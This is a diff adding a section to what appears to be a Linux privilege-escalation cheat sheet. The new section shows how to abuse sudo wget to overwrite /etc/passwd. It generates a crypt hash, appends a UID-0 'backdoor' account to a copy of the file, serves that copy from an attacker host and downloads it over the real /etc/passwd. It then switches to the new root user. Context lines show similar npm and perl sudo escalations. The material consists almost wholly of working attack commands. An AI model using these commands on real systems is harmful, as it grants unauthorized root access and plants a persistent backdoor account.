@@ -539,6 +539,27 @@ echo '{"scripts":{"shell":"sh"}}' > /tmp/package.json
 sudo -u <user> /usr/bin/npm run shell --prefix /tmp
 ```
 
+sudo wget (file write — /etc/passwd overwrite)
+```bash
+# Generate a crypt hash for the backdoor password
+openssl passwd -1 -salt <salt> <password>
+# e.g. openssl passwd -1 -salt password password
+# → $1$password$Da2mWXlxe6J7jtww12SNG/
+
+# Append backdoor root entry to a local copy of /etc/passwd
+cp /etc/passwd /tmp/passwd.bak
+echo 'backdoor:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
+
+# Serve from attacker machine, then overwrite with sudo wget
+# On attacker:
+sudo python3 -m http.server 80
+# On target:
+sudo /usr/bin/wget http://<attacker>/passwd.bak -O /etc/passwd
+
+# Switch to backdoor user
+su - backdoor   # password: <password>
+```
+
 sudo perl (via script in user-controlled directory)
 ```bash
 # If script path is in a directory you own, replace the script:
